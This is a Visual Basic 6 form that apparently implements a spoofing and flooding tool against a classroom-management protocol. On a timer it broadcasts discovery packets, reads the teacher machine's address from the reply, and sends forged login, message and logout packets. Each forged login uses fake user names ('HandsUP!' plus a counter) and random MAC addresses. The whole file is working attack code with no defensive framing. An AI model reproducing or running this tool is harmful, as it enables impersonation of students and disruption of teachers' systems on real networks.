VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Form1"
   ClientHeight    =   495
   ClientLeft      =   105
   ClientTop       =   435
   ClientWidth     =   3015
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   495
   ScaleWidth      =   3015
   StartUpPosition =   2  'ÆÁÄ»ÖÐÐÄ
   Begin VB.HScrollBar HScroll1 
      Height          =   255
      LargeChange     =   500
      Left            =   120
      Max             =   2000
      SmallChange     =   15
      TabIndex        =   0
      Top             =   120
      Value           =   15
      Width           =   2775
   End
   Begin VB.Timer Timer1 
      Interval        =   500
      Left            =   0
      Top             =   0
   End
   Begin MSWinsockLib.Winsock WS2 
      Left            =   960
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
      LocalPort       =   4605
   End
   Begin MSWinsockLib.Winsock WS1 
      Left            =   480
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
      Protocol        =   1
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

Dim KACA() As Byte
Dim LOGI() As Byte
Dim MESS() As Byte
Dim LOGO() As Byte

Dim WACA() As Byte

Dim TeacherIP As Long

Dim pIP1 As Long
Dim pIP2 As Long
Dim pUserName As Long
Dim pComputerName As Long
Dim pUnknown As Long
Dim pDisplayName As Long
Dim pMAC As Long
Dim pIP3 As Long

Dim iIP As Long

Private Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)

Private Sub InitArray(Arr() As Byte, Str As String)
    Dim i As Long
    Dim StrArr() As String
    StrArr() = Split(Trim(Str), " ")
    ReDim Arr(UBound(StrArr()))
    For i = 0 To UBound(StrArr())
        Arr(i) = "&h" & StrArr(i)
    Next i
End Sub

Private Function FindAddress(Arr() As Byte, Signture As Byte) As Long
    Dim i As Long
    For i = 0 To UBound(Arr())
        If Arr(i) = Signture Then
            FindAddress = VarPtr(Arr(i))
            Exit Function
        End If
    Next i
End Function

Private Sub Send()
    On Error Resume Next
    WS2.Close
    WS2.Bind 4605
    WS1.Close
    WS1.RemotePort = 4605
    WS1.SendData KACA()
End Sub

Private Sub Form_Load()
    InitArray KACA(), "4B 41 43 41 00 00 01 00 04 00 00 00 19 6D 6A F9 29 5B B9 46 AB 95 8A 14 3E CD DC 26 FF 00 00 00"
    pIP1 = FindAddress(KACA(), 255)
    Dim LOGITemple As String
    LOGITemple = "4C 4F 47 49 01 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 FF 00 00 00 FE 00 00 00 " 'IP,USERNAME
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 FD 00 00 00 " 'COMPUTERNAME
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 FC 00 00 00 " '???,SIMILAR AS USERNAME
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 FB 00 00 00 " 'DISPLAYNAME
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 FA 00 00 " 'MAC
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "
    LOGITemple = LOGITemple & "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
    InitArray LOGI(), LOGITemple
    pIP2 = FindAddress(LOGI(), 255)
    pUserName = FindAddress(LOGI(), 254)
    pComputerName = FindAddress(LOGI(), 253)
    pUnknown = FindAddress(LOGI(), 252)
    pDisplayName = FindAddress(LOGI(), 251)
    pMAC = FindAddress(LOGI(), 250)
    InitArray MESS(), "4D 45 53 53 01 00 00 00 01 00 00 00 FF 00 00 00 0D 00 00 00 00 00 00 00 00 00 10 00 4D"
    pIP3 = FindAddress(MESS(), 255)
    InitArray LOGO(), "4C 4F 47 4F 01 00 00 00"
    WS1.RemoteHost = "255.255.255.255"
    Timer1.Interval = HScroll1.Value
    Randomize
End Sub

Private Sub HScroll1_Change()
    Timer1.Interval = HScroll1.Value
End Sub

Private Sub HScroll1_Scroll()
    Timer1.Interval = HScroll1.Value
End Sub

Private Sub Timer1_Timer()
    Dim IPB(3) As Byte
    Dim IPS() As String
    IPS() = Split(WS1.LocalIP, ".")
    IPB(0) = IPS(0)
    IPB(1) = IPS(1)
    IPB(2) = IPS(2)
    IPB(3) = IPS(3)
    CopyMemory ByVal pIP1, IPB(0), 4
    CopyMemory ByVal pIP2, IPB(0), 4
    Dim FakeUserName As String
    FakeUserName = "HandsUP!" & iIP
    Dim US() As Byte
    US() = FakeUserName
    CopyMemory ByVal pUserName, US(0), UBound(US())
    CopyMemory ByVal pComputerName, US(0), UBound(US())
    CopyMemory ByVal pUnknown, US(0), UBound(US())
    CopyMemory ByVal pDisplayName, US(0), UBound(US())
    CopyMemory ByVal pMAC, CLng(Rnd * &H7FFFFFFF), 2
    CopyMemory ByVal pMAC + 2, CLng(Rnd * &H7FFFFFFF), 2
    CopyMemory ByVal pMAC + 4, CLng(Rnd * &H7FFFFFFF), 2
    CopyMemory ByVal pIP3, TeacherIP, 4
    Form1.Caption = iIP
    Send
    iIP = iIP + 1
End Sub

Private Sub WS2_DataArrival(ByVal bytesTotal As Long)
    On Error Resume Next
    WS2.GetData WACA()
    Debug.Print StrConv(WACA(), vbUnicode)
    If WACA(0) = &H57 And WACA(1) = &H41 And WACA(2) = &H43 And WACA(3) = &H41 Then
        Dim Port As Long
        CopyMemory TeacherIP, WACA(28), 4
        CopyMemory Port, WACA(32), 4
        Port = Port * &H200
        Port = Port + &H1388
        WS1.Close
        WS1.RemotePort = Port
        WS1.SendData LOGI()
        WS1.SendData MESS()
        WS1.SendData LOGO()
    End If
End Sub

